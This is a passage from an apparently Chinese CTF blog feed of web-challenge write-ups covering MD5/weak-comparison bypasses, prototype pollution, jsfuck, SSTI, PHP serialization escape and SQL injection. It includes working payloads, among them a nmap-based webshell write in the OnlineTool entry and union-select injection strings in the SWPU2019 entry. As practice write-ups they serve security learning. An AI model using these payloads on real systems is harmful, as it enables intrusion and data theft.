    <content><![CDATA[<h1 id="GAME-V4-0"><a href="#GAME-V4-0" class="headerlink" title="GAME V4.0"></a>GAME V4.0</h1><p>web的第一道签到题：</p>
<p>打开页面可以看到是一个小游戏：</p>
<p>直接看源代码把</p>
<p><img src="/2022/02/13/GameV4-0/1.png" alt="1"></p>
<p>没什么别的问题，那就看看他的这些子文件中有没有什么信息</p>
<p>最后在data.js中发现</p>
<p><img src="/2022/02/13/GameV4-0/2.png" alt="1"></p>
<p>含有flag名称的新型</p>
<p>解码一下得到flag</p>
<p><img src="/2022/02/13/GameV4-0/3.png" alt="1"></p>
]]></content>
      <tags>
        <tag>V&amp;NCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020]Ez_bypass</title>
    <url>/2022/01/29/MRCTF2020-Ez-bypass/</url>
    <content><![CDATA[<h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>首先进入题目看一看</p>
<p><img src="/2022/01/29/MRCTF2020-Ez-bypass/2.png" alt="1"></p>
<p>进入源码可以看到排列好的函数</p>
<p><img src="/2022/01/29/MRCTF2020-Ez-bypass/1.png" alt="1"></p>
<p>可以看出我们需要绕过这些if</p>
<p>考到了两个知识点：</p>
<p>1、MD5碰撞绕过</p>
<p>2、php弱比较</p>
<p>MD5碰撞比较好绕过</p>
<p>可以通过数组绕过（0e绕过，但是尝试了一下不知道为啥不行）</p>
<p>因为MD5无法操作数组它会将数组看成0，但是MD5之前的数又不相同所以可以直接绕过</p>
<p><img src="/2022/01/29/MRCTF2020-Ez-bypass/3.png" alt="1"></p>
<p>接下来的弱比较漏洞更好绕过了</p>
<p>他需要判断passwd为1234567</p>
<p>我们只需要传入1234567后面带字母就行了</p>
<p>因为php是一个弱类型的函数</p>
<p>而我们输入的数的第一个是1为整型所以她会把这组数据都看作整型</p>
<p>直接过滤掉a</p>
<p>就可以直接拿到flag</p>
<p><img src="/2022/01/29/MRCTF2020-Ez-bypass/4.png" alt="1"></p>
<p>$flag=”flag{cf290612-38d0-46a8-9ab8-396a0c556d2a}“</p>
]]></content>
      <tags>
        <tag>MRCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Most-Secure-Calculator</title>
    <url>/2022/01/28/Most-Secure-Calculator/</url>
    <content><![CDATA[<h1 id="计算器1"><a href="#计算器1" class="headerlink" title="计算器1"></a>计算器1</h1><p>一样先进去看一下</p>
<p><img src="/2022/01/28/Most-Secure-Calculator/1.png" alt="1"></p>
<p>进行一个简单的wfuzz测试</p>
<p>发现啥也没过滤</p>
<p>然后</p>
<p>随便输入一些数看看</p>
<p><img src="/2022/01/28/Most-Secure-Calculator/4.png" alt="1"></p>
<p>发现这里面是一个简单的命令执行所以直接执行系统命令试试</p>
<p><img src="/2022/01/28/Most-Secure-Calculator/2.png" alt="1"></p>
<p>发现可以执行基本的system命令</p>
<p>然后直接执行cat flag.txt就行拉</p>
<p><img src="/2022/01/28/Most-Secure-Calculator/3.png" alt="1"></p>
<h1 id="KCTF-WaS-mY-cAlCuLaToR-sAfE"><a href="#KCTF-WaS-mY-cAlCuLaToR-sAfE" class="headerlink" title="KCTF{WaS_mY_cAlCuLaToR_sAfE}"></a>KCTF{WaS_mY_cAlCuLaToR_sAfE}</h1>]]></content>
      <tags>
        <tag>knightctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Newcalc0</title>
    <url>/2022/02/15/Newcalc0/</url>
    <content><![CDATA[<h1 id="Newcalc0"><a href="#Newcalc0" class="headerlink" title="Newcalc0"></a>Newcalc0</h1><p>本题是一道nodejs：</p>
<p>是原型链污染</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">什么是原型链污染？</span><br><span class="line">js中几乎所有的东西都是一个对象，任何对象都有一个原型对象，这个原型对象由对象的内置属性proto指向它的构造函数的prototype指向的对象，即任何对象都是由一个构造函数创建的</span><br><span class="line"></span><br><span class="line">function a(name,age)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">&#125;</span><br><span class="line">a函数的内容就是a类的构造函数，a中的属性就是this.name、this.age</span><br><span class="line">在javascript中你生名了一个函数a之后，浏览器就会自动生成一个对象b（实例原型），a构造函数中就有一个默认的属性（prototype）指向对象b，b就是函数a的原型对象，其中b有一个默认的属性constructor指向函数a</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/15/Newcalc0/5.png" alt="1"></p>
<p><img src="/2022/02/15/Newcalc0/6.png" alt="1"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">实例对象的__proto__指向实例原型，实例原型的__proto__等于他上一级的实例原型直到object这是由于对象之间存在继承关系当上层没有就会再向上上层搜索，直到指向 null，若此时还未找到就会返回 undefined</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/15/Newcalc0/7.png" alt="1"></p>
<p><img src="/2022/02/15/Newcalc0/8.png" alt="1"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">原型链污染就是修改其构造函数中的属性值，使其他通过该构造函数实例化出的对象也具有这个属性的值。</span><br><span class="line">由于对象是无序的，当使用第二种方式访问对象时，只能使用指明下标的方式去访问。</span><br><span class="line">因此我们可以通过 a [“proto“] 的方式去访问其原型对象</span><br><span class="line"></span><br><span class="line">当我们调用对象属性时， 会查找属性，如果本身没有，则会去proto中查找，也就是构造函数的显式原型中查找，如果构造函数中也没有该属性，因为构造函数也是对象，也有proto，那么会去proto的显式原型中查找，一直到null。</span><br><span class="line">p神的文章中提到JavaScript原型链继承</span><br></pre></td></tr></table></figure>

<p>那么我们回到题目：</p>
<p>看到他的源码</p>
<p><img src="/2022/02/15/Newcalc0/1.png" alt="1"></p>
<p>首先这里有一个知识点：</p>
<p>console.table()会将数据以表格的形式输出</p>
<p>我们直接构造console.table([{a:1}],[‘__proto__‘])就可以添加一个表格更改flag页面中的object.prototype的值，使其绕过判断，直接输出flag</p>
<p><img src="/2022/02/15/Newcalc0/2.png" alt="1"></p>
<p><img src="/2022/02/15/Newcalc0/3.png" alt="1"></p>
]]></content>
      <tags>
        <tag>V&amp;NCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Obsfuscation Isn&#39;t Enough</title>
    <url>/2022/01/28/Obsfuscation-Isn-t-Enough/</url>
    <content><![CDATA[<h1 id="Obsfuscation-Isn’t-Enough"><a href="#Obsfuscation-Isn’t-Enough" class="headerlink" title="Obsfuscation Isn’t Enough"></a>Obsfuscation Isn’t Enough</h1><p><img src="/2022/01/28/Obsfuscation-Isn-t-Enough/4.png" alt="1"></p>
<p>猜测可能是sql注入但是不管，先看看源代码</p>
<p><img src="/2022/01/28/Obsfuscation-Isn-t-Enough/1.png" alt="1"></p>
<p>发现一串很奇怪的符号其实是jsfuck</p>
<p>可以直接拿到进开发者工具中执行</p>
<p><img src="/2022/01/28/Obsfuscation-Isn-t-Enough/2.png" alt="1"></p>
<p>发现其中返回了location，直接进入那个页面看看</p>
<p><img src="/2022/01/28/Obsfuscation-Isn-t-Enough/3.png" alt="1"></p>
<p>直接拿到了flag</p>
]]></content>
      <tags>
        <tag>knightctf</tag>
      </tags>
  </entry>
  <entry>
    <title>OnlineTool</title>
    <url>/2022/03/03/OnlineTool/</url>
    <content><![CDATA[<h1 id="OnlineTool"><a href="#OnlineTool" class="headerlink" title="OnlineTool"></a>OnlineTool</h1><p>昨天的朱雀杯提到了这个，想了一下自己好像没写wp，今天补一下</p>
<p>源码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;host&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $host = $_GET[&#x27;host&#x27;];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    echo &#x27;you are in sandbox &#x27;.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到需要我们提供一个host，host会经过两层过滤</p>
<p>一层是<code>escapeshellarg</code>另一层是<code>escapeshellcmd</code>,escapeshellarg命令的含义是将给字符串增加一对单引号并且能引用或者转码任何已经存在的单引号,他要正常执行还需要在这中间包裹其中的符号来执行</p>
<p>比如说：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &#x27; -s -v a=1</span><br><span class="line">进行过滤之后就会变成</span><br><span class="line">&#x27;127.0.0.1&#x27;\&#x27;&#x27; -s -v a=1&#x27;</span><br></pre></td></tr></table></figure>

<p>而<code>escapeshellcmd</code>命令的含义是对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&amp; # ; ` | * ? ~ &lt; &gt; ^ ( ) [ ] &#123; &#125; $\ \x0A \xFF</span><br><span class="line">’和&quot;仅在不配对的时候会进行转义</span><br></pre></td></tr></table></figure>

<p>这本来是没有什么问题的，但是搭配起来就会出现问题：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">比如说上面的escapeshellarg过滤之后的字符再进行escapeshellcmd过滤：</span><br><span class="line">也就是说上面的会变成</span><br><span class="line">&#x27;127.0.0.1&#x27;\\&#x27;&#x27; -s -v a=1&#x27;</span><br><span class="line">这样就把上面的语句分成了三个部分：</span><br><span class="line">127.0.0.1    &#x27;空&#x27;   以及一个post方式传入的a=1&#x27;</span><br></pre></td></tr></table></figure>

<p>比如我们写一个:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1&#x27;</span><br><span class="line">经过escapeshellarg之后变成</span><br><span class="line">&#x27;1&#x27;\&#x27;&#x27;&#x27;</span><br><span class="line">在经过escapeshellcmd之后会变成(她会转义单独的引号还有其他的符号)</span><br><span class="line">也就是\和最后的’会被转义</span><br><span class="line">变成：</span><br><span class="line">&#x27;1&#x27;\\&#x27;&#x27;\&#x27;</span><br><span class="line">为了方便观看写到一起：</span><br><span class="line">&#x27;1&#x27;\&#x27;&#x27;&#x27;</span><br><span class="line">&#x27;1&#x27;\\&#x27;&#x27;\&#x27;</span><br></pre></td></tr></table></figure>

<p>将他放到题目中去：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot; . &#x27;1&#x27;\\&#x27;&#x27;\&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">\\会被解析成一个\两个连续的单引号会被解析成一个空白</span><br><span class="line">如果我们输入的是</span><br><span class="line">1&#x27;命令&#x27;</span><br><span class="line">那么就会变成</span><br><span class="line">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F&quot; . &#x27;127.0.0.1&#x27;\\&#x27;&#x27; 命令 &#x27;\\&#x27;&#x27;&#x27;</span><br><span class="line">也就是</span><br><span class="line">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F&quot; . &#x27;127.0.0.1&#x27; 命令 \</span><br><span class="line">我们输入的命令就会被nmap解析成条件，我们就可以写入一个nmap写文件参数执行。</span><br></pre></td></tr></table></figure>

<p>附上nmap的利用参数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">选项 解释</span><br><span class="line">-oN 标准保存</span><br><span class="line">-oX XML保存</span><br><span class="line">-oG Grep保存</span><br><span class="line">-oA 保存到所有格式</span><br><span class="line">-append-output 补充保存文件</span><br></pre></td></tr></table></figure>

<p>最终payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#x27; &lt;?php eval($_POST[&quot;a&quot;]); ?&gt; -oG hack.php &#x27;</span><br></pre></td></tr></table></figure>

<p>然后访问hack.php命令执行就行了</p>
]]></content>
  </entry>
  <entry>
    <title>SWPU2019-WEB1</title>
    <url>/2022/03/06/SWPU2019-WEB1/</url>
    <content><![CDATA[<h1 id="SWPY2019-WEB-1"><a href="#SWPY2019-WEB-1" class="headerlink" title="[SWPY2019]WEB 1"></a>[SWPY2019]WEB 1</h1><p>也算是通过题目学sql注入了</p>
<p>进入题目</p>
<p>发现是一个登录框，一直测了很久，发现还是得注册进去</p>
<p>似乎是没啥漏洞</p>
<p>进去发现，是一个广告申请系统</p>
<p>我们可以进行申请广告并进去查看</p>
<p>看了一下，好像漏洞出现再这个申请广告的地方，得先随便上传一些东西看看是啥样</p>
<p><img src="/2022/03/06/SWPU2019-WEB1/3.png" alt="1"></p>
<p>看到我们写入的标题以及内容都显示在页面上，还可以进去查看内容</p>
<p>稍微测试了一下看看是xss还是sql</p>
<p>最终发现还是sql，在外面她会给你看你原来输入的东西，但是点进去之后</p>
<p>会执行sql语句</p>
<p>而且是单引号闭合，但是%27 还有#都被过滤了，没办法注释后面的内容</p>
<p>又写入一些数据测试一下发现</p>
<p>当我们输入两个<code>1&#39;123</code>时会返回‘123’报错，也就是说我们可以再构造一个单引号使得单引号，输入联合查询函数就可以运行我们的查询语句</p>
<p>运行联合查询的时候发现又过滤了<code>/**/</code>因为一半这个都能过，我就测试了一下，是可以的然后一直联合查询，但是数据一直不对，最后看到队列长度是22</p>
<p><img src="/2022/03/06/SWPU2019-WEB1/1.png" alt="1"></p>
<p>点进去一看</p>
<p><img src="/2022/03/06/SWPU2019-WEB1/2.png" alt="1"></p>
<p>在2，3处回显了</p>
<p>也就是说我们需要在这里面构造我们的查询语句</p>
<p>但是在查询的时候发现information_schema被过滤了，去网上查了一下找了两种方法bypass</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql.innodb_table_stats</span><br><span class="line">sys.schema_auto_increment_columns</span><br></pre></td></tr></table></figure>

<p>可以构造</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats</span><br></pre></td></tr></table></figure>

<p>查询到我们需要使用的表</p>
<p>接下来的列怎么办，没办法知道他的列名：</p>
<p>实在没办法查询了一下大佬们的wp</p>
<p>发现需要用无列名查询</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line"></span><br><span class="line">https://www.jianshu.com/p/dc9af4ca2d06</span><br><span class="line"></span><br><span class="line">https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">查询全部列名的一般方法：</span><br><span class="line">select * from users</span><br><span class="line"></span><br><span class="line">假设有6列</span><br><span class="line">select 1,2,3,4,5,6 union select * from users</span><br><span class="line"></span><br><span class="line">列名就会以数字标号,因为是*所以他会以1-6来排序</span><br><span class="line"></span><br><span class="line">如果需要提取其中某一列，可以用反引号标注出列号(最后需要添加任意字符串ps:不知道为啥)</span><br><span class="line"></span><br><span class="line">假设我们需要查询第四列的数据我们就可以输入</span><br><span class="line">select `4` from （select 1，2，3，4，5，6 union select * from users)a</span><br></pre></td></tr></table></figure>

<p>但是这一题反引号被过滤了</p>
<p>所以我们需要找别的方法，发现as可以替代反引号的功效</p>
<p>上面的方法可以改成</p>
<p><code>select a fron (select 1,2,3,4 as a,5,6 union select * fron users)a</code></p>
<p>最后我们直接构造payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/06/SWPU2019-WEB1/7.PNG" alt="1"></p>
<p>拿到flag</p>
]]></content>
      <tags>
        <tag>SWPU2019</tag>
      </tags>
  </entry>
  <entry>
    <title>Tetris plus</title>
    <url>/2022/02/06/Tetris-plus/</url>
    <content><![CDATA[<h1 id="Tetris-plus"><a href="#Tetris-plus" class="headerlink" title="Tetris-plus"></a>Tetris-plus</h1><p>进入题目：</p>
<p>发现是个游戏，先小玩一把。</p>
<p><img src="/2022/02/06/Tetris-plus/1.png" alt="1"></p>
<p>到最后也没发现啥问题</p>
<p>点点别的也都正常</p>
<p>看看源代码</p>
<p><img src="/2022/02/06/Tetris-plus/3.png" alt="1"></p>
<p>都是些不痛不痒的东西，但是包含的js非常多，都点进去看看</p>
<p>在check.js页面发现他注释了段很长的东西，之前写过的jsfuck</p>
<p><img src="/2022/02/06/Tetris-plus/2.png" alt="1"></p>
<p>直接拿去开发者页面去编译一下jsfuck</p>
<p><img src="/2022/02/06/Tetris-plus/5.png" alt="1"></p>
<p>就得到了flag拉</p>
]]></content>
      <tags>
        <tag>hgame</tag>
      </tags>
  </entry>
  <entry>
    <title>Themysteryofip</title>
    <url>/2022/02/03/Themysteryofip/</url>
    <content><![CDATA[<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>做一下题目：</p>
<p><img src="/2022/02/03/Themysteryofip/1.png" alt="1"></p>
<p>有三个子网页</p>
<p>flag以及hint</p>
<p>flag网页中回显了ip</p>
<p><img src="/2022/02/03/Themysteryofip/2.png" alt="1"></p>
<p>看看第另一个子网页，源码发现一句话</p>
<p><img src="/2022/02/03/Themysteryofip/3.png" alt="1"></p>
<p>回到flag网页中注入一下XFF</p>
<p>发现可以</p>
<p><img src="/2022/02/03/Themysteryofip/4.png" alt="1"></p>
<p>尝试一下函数发现不会执行</p>
<p><img src="/2022/02/03/Themysteryofip/9.png" alt="1"></p>
<p>试试别的方法，输入加减乘除看看有没有模板漏洞</p>
<p><img src="/2022/02/03/Themysteryofip/6.png" alt="1"></p>
<p>发现有模板漏洞</p>
<p>利用一下直接执行命令</p>
<p><img src="/2022/02/03/Themysteryofip/7.png" alt="1"></p>
<p>发现可以直接执行</p>
<p>直接执行cat /flag</p>
<p><img src="/2022/02/03/Themysteryofip/8.png" alt="1"></p>
<p>就可以拿到flag</p>
]]></content>
      <tags>
        <tag>BJDCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Unicorn shop</title>
    <url>/2022/02/28/Unicorn-shop/</url>
    <content><![CDATA[<h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p>刷题刷题。</p>
<p>题目名字是独角兽商店</p>
<p>进去看看</p>
<p><img src="/2022/02/28/Unicorn-shop/6.png" alt="1"></p>
<p>意思是我们输入商品名还有价钱来购买它</p>
<p>啥也不输直接点购买看看会出现什么问题：</p>
<p><img src="/2022/02/28/Unicorn-shop/1.png" alt="1"></p>
<p>可以看到返回了一堆目录还有一个报错</p>
<p>需要一个单独的unicode字符串作为参数</p>
<p>那么我们试试输入，购买上面的便宜的商品看看，</p>
<p>发现</p>
<p><img src="/2022/02/28/Unicorn-shop/2.png" alt="1"></p>
<p>测试一个最下面的那个，最下面吗那个应该是我们需要购买的flag</p>
<p><img src="/2022/02/28/Unicorn-shop/4.png" alt="1"></p>
<p>也不让访问</p>
<p>看看源码</p>
<p><img src="/2022/02/28/Unicorn-shop/3.png" alt="1"></p>
<p>他在编码后面添加了一句提示，那么可能在编码方面可能会出现一些问题，上网查了一下，我们需要找到一个字符，它的数值需要大于1337，从而绕过这个过滤</p>
<p>可以在这里找</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://www.compart.com/en/unicode/</span><br></pre></td></tr></table></figure>

<p>直接搜索thousand，在里面找，只要它的数值大于1337的就行了</p>
<p><img src="/2022/02/28/Unicorn-shop/5.png" alt="1"></p>
<p>输入，返回flag</p>
]]></content>
      <tags>
        <tag>ASIS</tag>
      </tags>
  </entry>
  <entry>
    <title>cybergrabs-easyweb</title>
    <url>/2022/02/08/cybergrabs-easyweb/</url>
    <content><![CDATA[<h1 id="easy-web"><a href="#easy-web" class="headerlink" title="easy-web"></a>easy-web</h1><p>进入题目也得先看看</p>
<p><img src="/2022/02/08/cybergrabs-easyweb/1.png" alt="1"></p>
<p>啥也没有，源代码也没啥</p>
<p>抓个包看下（因为他刚进去的时候有的要等响应，抓错几次）</p>
<p><img src="/2022/02/08/cybergrabs-easyweb/2.png" alt="1"></p>
<p>可以看到我们传过去一个cookie</p>
<p>而且从服务器端回传了一个cookie的value值，我们拿到这个值直接去base64解码就可以得到了</p>
]]></content>
      <tags>
        <tag>Cyber Grabs</tag>
      </tags>
  </entry>
  <entry>
    <title>cybergrabs-rabbit</title>
    <url>/2022/02/08/cybergrabs-rabbit/</url>
    <content><![CDATA[<h1 id="rabblt"><a href="#rabblt" class="headerlink" title="rabblt"></a>rabblt</h1><p>这道题跟之前的不一样</p>
<p>在tryhackme网站里开了个攻击机</p>
<p>我们自己连连不上</p>
<p>题目提示让我们read flag.txt</p>
<p>我们可以想到可能是文件读取或者文件包含，让我们直接读到flag.txt之中的内容</p>
<p>打开之后照常先进网站看看</p>
<p><img src="/2022/02/08/cybergrabs-rabbit/2.png" alt="1"></p>
<p>发现这些没有那种类似文件包含的漏洞，</p>
<p>那么会不会是在根目录下面直接读取flag.txt</p>
<p>尝试了一下dirsearch，但是攻击机里面没有</p>
<p>但是前面题目中提示了flag应该是在flag.txt里面</p>
<p>所以我们直接读取flag.txt试试</p>
<p><img src="/2022/02/08/cybergrabs-rabbit/3.png" alt="1"></p>
<p>可以看到可以读取到flag</p>
<p>提交</p>
<p><img src="/2022/02/08/cybergrabs-rabbit/4.png" alt="1"></p>
]]></content>
      <tags>
        <tag>Cyber Grabs</tag>
      </tags>
  </entry>
  <entry>
    <title>easy-serialize-php</title>
    <url>/2022/02/09/easy-serialize-php/</url>
    <content><![CDATA[<h1 id="安洵杯-easy-serialize-php"><a href="#安洵杯-easy-serialize-php" class="headerlink" title="[安洵杯]easy_serialize_php"></a>[安洵杯]easy_serialize_php</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">题目涉及到序列化漏洞的字符逃逸</span><br><span class="line">因为到后面序列化写不明白，看了一下大佬的wp</span><br><span class="line">（https://www.jianshu.com/p/8e8117f9fd0e）</span><br></pre></td></tr></table></figure>

<p>进入题目有一个链接里面是源码</p>
<p><img src="/2022/02/09/easy-serialize-php/1.png" alt="1"></p>
<p>可以看到我们现在是在index.php网页中</p>
<p>源码中提示在phpinfo里面由我们需要的东西</p>
<p>进去看看</p>
<p><img src="/2022/02/09/easy-serialize-php/2.png" alt="1"></p>
<p>找到了一个子网页，那么就优先考虑到文件读取</p>
<p>看了一圈只有最后输出的时候又个file_get_contents函数可以读取文件内容，他读取的文件内容是base64解码之后的img</p>
<p>继续跟踪一下img，发现是由image_path传送进来的，但是我们输入img的时候会被函数过滤，所以img不可控</p>
<p>找找别的方法，下面有个反序列化函数是我们可以更改的，那么我们是不是可以构造一个我们的文件来赋值给img来直接进行文件读取呢</p>
<p>首先我们读取的文件base64：ZDBnM19mMWFnLnBocA==那么我们需要读取的内容就是s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”</p>
<p>但是我上面有个过滤：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);</span><br><span class="line">    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($filter,&#x27;&#x27;,$img);// 在img中的所有的filter含有的字符串替换成空</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在这里面’php’,’flag’,’php5’,’php4’,’fl1g’会被替换为空</p>
<p>也就是说</p>
<p><img src="/2022/02/09/easy-serialize-php/6.png" alt="1"></p>
<p>这是我们序列化之后的结果，但是经过过滤，它就变成了</p>
<p><img src="/2022/02/09/easy-serialize-php/7.png" alt="1"></p>
<p>那么他是否可以继续执行呢？</p>
<p>这就涉及到字符串逃逸：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>因为经过过滤，把flag全部替换为空，所以序列化出现了问题，但是可以看到在替换之后<strong>s:24:” ”</strong>后面的24个字符**;s:8:”function”;s:59:”a“<strong>之后又是一个</strong>“;**直接闭合了，那么它会直接运行</p>
<p>也就是说我们可以依靠这个过滤直接构造一个img来读取到我们想要读取的文件</p>
<h4 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">get:f=show_image</span><br><span class="line">post_SESSION[flagflag]=&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;</span><br></pre></td></tr></table></figure>

<p>session序列化之后是这样的：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:8:&quot;flagflag&quot;;s:49:&quot;&quot;;s:1:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</span><br><span class="line">过滤之后：</span><br><span class="line">a:1:&#123;s:8:&quot;&quot;;s:49:&quot;&quot;;s:1:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>过滤之后就是把<strong>a</strong>赋值给了**;s:49:””**后面就是把我们需要输入的内容赋值给img就可以拉</p>
<p>拿到页面内容：<img src="/2022/02/09/easy-serialize-php/3.png" alt="1"></p>
<p><img src="/2022/02/09/easy-serialize-php/5.png" alt="1"></p>
<p>我们直接将刚刚读取的文件名替换成这个就可以得到flag了</p>
<h3 id="最终payload："><a href="#最终payload：" class="headerlink" title="最终payload："></a>最终payload：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">get:f=show_image</span><br><span class="line">post_SESSION[flagflag]=&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>安洵杯</tag>
      </tags>
  </entry>
  <entry>
    <title>fakebook</title>
    <url>/2022/01/31/fakebook/</url>
    <content><![CDATA[<h1 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h1><p>今天的第二条</p>
<p>先看看题目</p>
<p><img src="/2022/01/31/fakebook/1.png" alt="1"></p>
<p>页面上有些登录信息以及两个网页</p>
<p>join创建账户</p>
<p><img src="/2022/01/31/fakebook/2.png" alt="1"></p>
<p><img src="/2022/01/31/fakebook/7.png" alt="1"></p>
<p>login登录</p>
<p>登上去试试</p>
<p><img src="/2022/01/31/fakebook/6.png" alt="1"></p>
<p>可以看到这里面注入都没啥用</p>
<p>用户名可以点击</p>
<p>进去看看</p>
<p><img src="/2022/01/31/fakebook/8.png" alt="1"></p>
<p>可以看到以get方式传入了一个no</p>
<p>测试一下sql注入</p>
<p>发现屏蔽了空格可以用/**/绕过</p>
<p>看一下列数</p>
<p><img src="/2022/01/31/fakebook/3.png" alt="1"></p>
<p>看到有4列而且2在页面上回显了</p>
<p>看到有sql注入漏洞</p>
<p>进行注入</p>
<p><img src="/2022/01/31/fakebook/4.png" alt="1"></p>
<p><img src="/2022/01/31/fakebook/5.png" alt="1"></p>
<p>可以看到库表列，下面写一下我拿到的结果</p>
<p>fakebook,information_schema,mysql,performance_schema,test    库</p>
<p>fakebook里面含有users里面是我们注册时账号密码</p>
<p>但是可以看到</p>
<p><img src="/2022/01/31/fakebook/11.png" alt="1"></p>
<p>可以看到里面时我们的账号密码以及data</p>
<p>我们的密码时按照序列化显示的</p>
<p>到这里卡住了</p>
<p>想想别的办法</p>
<p>查看一下robots.txt看看网页有没有设置机器人</p>
<p><img src="/2022/01/31/fakebook/9.png" alt="1"></p>
<p>一看还真有</p>
<p>里面给出了提示有一个uesr.php的备份文件</p>
<p>我们输入这个网址可以下载到这个文件的源代码</p>
<p>看一下</p>
